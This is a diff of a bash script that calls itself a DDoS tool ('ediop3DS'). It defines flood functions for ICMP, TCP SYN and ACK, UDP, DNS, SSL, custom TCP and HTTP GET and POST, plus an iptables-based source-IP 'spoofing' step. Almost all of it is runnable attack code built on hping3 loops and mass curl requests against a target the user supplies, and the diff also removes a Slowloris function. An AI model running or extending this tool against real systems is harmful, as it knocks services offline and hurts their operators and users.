@@ -9,14 +9,15 @@ CYAN="\e[36m"
 WHITE="\e[97m"
 RESET="\e[0m"
 
-# Default values to reduce lag or missing vars
+# Default values
 port=80
 num_requests=1000
 pSize=56
-P=0.01  # default packet delay
+P=0.01
 proto="TCP"
+verbose=0
 
-# Display logo function
+# Display logo
 display_logo() {
     echo -e "${CYAN}"
     echo -e """
@@ -26,18 +27,11 @@ display_logo() {
 ██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
 ███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
 ╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░
-
-██████╗░░██████╗
-██╔══██╗██╔════╝
-██║░░██║╚█████╗░
-██║░░██║░╚═══██╗
-██████╔╝██████╔╝
-╚═════╝░╚═════╝░
 """
     echo -e "${RESET}"
 }
 
-# Help function
+# Help
 show_help() {
     display_logo
     echo -e "\nUsage: ./ediop3DS.sh -u target_ip_or_url -p port [options]\n"
@@ -46,25 +40,26 @@ show_help() {
     echo -e "  -p       Target Port (default: 80)"
     echo -e "  -h       Show this help message"
     echo -e "  -r       Retry attack without port if no open ports are found"
-    echo -e "  -i       Send ICMP ping flood (requires root)"
-    echo -e "  -S       Send TCP SYN flood (requires root)"
-    echo -e "  -A       Send TCP ACK flood (requires root)"
-    echo -e "  -U       Send UDP flood (requires root)"
-    echo -e "  -f IP    Specify a spoofed source IP address"
-    echo -e "  -n NUM   Set number of requests (default: 1000)"
-    echo -e "  -H HDR   Send custom HTTP headers"
-    echo -e "  -pSize   Specify packet size (default: 56)"
-    echo -e "  -proto   Specify protocol (TCP, UDP, ICMP, RAW-IP)"
+    echo -e "  -i       Send ICMP ping flood"
+    echo -e "  -S       Send TCP SYN flood"
+    echo -e "  -A       Send TCP ACK flood"
+    echo -e "  -U       Send UDP flood"
+    echo -e "  -f IP    Spoof source IP"
+    echo -e "  -n NUM   Number of requests (default: 1000)"
+    echo -e "  -H HDR   Custom HTTP headers"
+    echo -e "  -pSize   Packet size (default: 56)"
+    echo -e "  -proto   Protocol (TCP, UDP, ICMP, RAW-IP)"
     echo -e "  -P DELAY Packet delay in seconds (default: 0.01)"
-    echo -e "  -l       Perform Slowloris attack"
+    echo -e "  -l       Slowloris attack"
     echo -e "  -F       Test firewall"
-    echo -e "  -I       Send DNS Flood attack"
+    echo -e "  -I       DNS flood"
     echo -e "  -T       HTTP GET flood"
     echo -e "  -L       HTTP POST flood"
-    echo -e "  -V       Perform SSL DDoS attack"
+    echo -e "  -V       SSL DDoS"
     echo -e "  -M       Custom TCP packet flood"
 }
 
+# Scan open ports
 scan_ports() {
     target=$1
     echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
@@ -78,6 +73,7 @@ scan_ports() {
     fi
 }
 
+# Read user agents from file
 read_user_agents() {
     if [ -f "user_agents.txt" ]; then
         mapfile -t user_agents < user_agents.txt
@@ -87,108 +83,138 @@ read_user_agents() {
     fi
 }
 
+# Retry attack function
 retry_attack() {
     target=$1
     attack_type="$2"
     attack_func="${attack_type}_flood"
+    if [ -z "$port" ]; then
+        echo -e "${YELLOW}[+] No open ports found, using default port: $port${RESET}"
+        port=80
+    fi
     $attack_func $target
 }
 
+# Spoof source IP address
 spoof_ip() {
     ip=$1
     echo -e "${CYAN}[*] Spoofing source IP address: $ip${RESET}"
     iptables -t nat -A POSTROUTING -s $ip -j MASQUERADE
 }
 
+# Apply custom HTTP headers
 custom_headers() {
     header=$1
     echo -e "${CYAN}[*] Using custom HTTP header: $header${RESET}"
     curl -s -X GET http://$target -H "$header" > /dev/null 2>&1
 }
 
+# ICMP flood
 icmp_flood() {
     target=$1
-    echo -e "${CYAN}[*] ICMP flood on $target${RESET}"
+    echo -e "${CYAN}[*] ICMP flood on $target using $proto${RESET}"
+    read_user_agents
     for ((i=0; i<$num_requests; i++)); do
-        hping3 --icmp -p $port $target > /dev/null 2>&1 &
+        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        [[ $proto == "ICMP" ]] && hping3 --icmp -p $port --data $pSize $target > /dev/null 2>&1 &
+        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending ICMP request $i${RESET}"
         sleep $P
     done
     wait
 }
 
+# SYN flood
 syn_flood() {
     target=$1
     echo -e "${CYAN}[*] TCP SYN flood on $target${RESET}"
     read_user_agents
     for ((i=0; i<$num_requests; i++)); do
-        python3 syn_flood.py -t $target -p $port -n $num_requests > /dev/null 2>&1 &
+        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        [[ $proto == "TCP" ]] && hping3 --syn -p $port --data $pSize $target > /dev/null 2>&1 &
+        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending SYN request $i${RESET}"
         sleep $P
     done
     wait
 }
 
+# ACK flood
 ack_flood() {
     target=$1
     echo -e "${CYAN}[*] TCP ACK flood on $target${RESET}"
+    read_user_agents
     for ((i=0; i<$num_requests; i++)); do
-        hping3 --ack -p $port --data $pSize $target > /dev/null 2>&1 &
+        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        [[ $proto == "TCP" ]] && hping3 --ack -p $port --data $pSize $target > /dev/null 2>&1 &
+        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending ACK request $i${RESET}"
         sleep $P
     done
     wait
 }
 
+# UDP flood
 udp_flood() {
     target=$1
     echo -e "${CYAN}[*] UDP flood on $target${RESET}"
+    read_user_agents
     for ((i=0; i<$num_requests; i++)); do
-        hping3 --udp -p $port --data $pSize $target > /dev/null 2>&1 &
+        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        [[ $proto == "UDP" ]] && hping3 --udp -p $port --data $pSize $target > /dev/null 2>&1 &
+        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending UDP request $i${RESET}"
         sleep $P
     done
     wait
 }
 
+# DNS flood
 dns_flood() {
     target=$1
     echo -e "${CYAN}[*] DNS flood on $target${RESET}"
+    read_user_agents
     for ((i=0; i<$num_requests; i++)); do
-        hping3 --udp -p 53 --data $pSize $target > /dev/null 2>&1 &
+        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        [[ $proto == "UDP" ]] && hping3 --udp -p 53 --data $pSize $target > /dev/null 2>&1 &
+        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending DNS request $i${RESET}"
         sleep $P
     done
     wait
 }
 
-check_and_run_slowloris() {
-    target=$1
-    echo -e "${CYAN}[*] Slowloris attack on $target${RESET}"
-    slowloris -d 60 -p $port $target
-}
-
+# Test firewall
 test_firewall() {
     target=$1
     echo -e "${CYAN}[*] Testing firewall on $target${RESET}"
     nmap -p $port $target
 }
 
+# SSL DDoS
 ssl_ddos() {
     target=$1
     echo -e "${CYAN}[*] SSL DDoS on $target${RESET}"
+    read_user_agents
     for ((i=0; i<$num_requests; i++)); do
+        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
         hping3 --tcp --syn -S -p 443 --data $pSize $target > /dev/null 2>&1 &
+        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending SSL request $i${RESET}"
         sleep $P
     done
     wait
 }
 
+# Custom TCP flood
 custom_tcp_flood() {
     target=$1
-    echo -e "${CYAN}[*] Custom TCP packet flood on $target${RESET}"
+    echo -e "${CYAN}[*] Custom TCP flood on $target${RESET}"
+    read_user_agents
     for ((i=0; i<$num_requests; i++)); do
+        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
         hping3 --syn -p $port --data $pSize $target > /dev/null 2>&1 &
+        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending custom TCP request $i${RESET}"
         sleep $P
     done
     wait
 }
 
+# HTTP GET flood
 http_flood() {
     target=$1
     echo -e "${CYAN}[*] HTTP GET flood on $target${RESET}"
@@ -196,11 +222,13 @@ http_flood() {
     for ((i=0; i<$num_requests; i++)); do
         ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
         curl -s -X GET http://$target -H "User-Agent: $ua" > /dev/null 2>&1 &
+        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending GET request $i${RESET}"
         sleep $P
     done
     wait
 }
 
+# HTTP POST flood
 post_flood() {
     target=$1
     echo -e "${CYAN}[*] HTTP POST flood on $target${RESET}"
@@ -208,12 +236,14 @@ post_flood() {
     for ((i=0; i<$num_requests; i++)); do
         ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
         curl -s -X POST http://$target --data "payload" -H "User-Agent: $ua" > /dev/null 2>&1 &
+        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending POST request $i${RESET}"
         sleep $P
     done
     wait
 }
 
-while getopts ":u:p:sirSAtf:n:HvlpSize:sFlag:seq:win:proto:P:l:t:FITLVM" option; do
+# Parse arguments
+while getopts ":u:p:sirSAtf:n:Hvl:t:FITLVMpSize:proto:P:" option; do
     case $option in
         u) target="$OPTARG";;
         p) port="$OPTARG";;
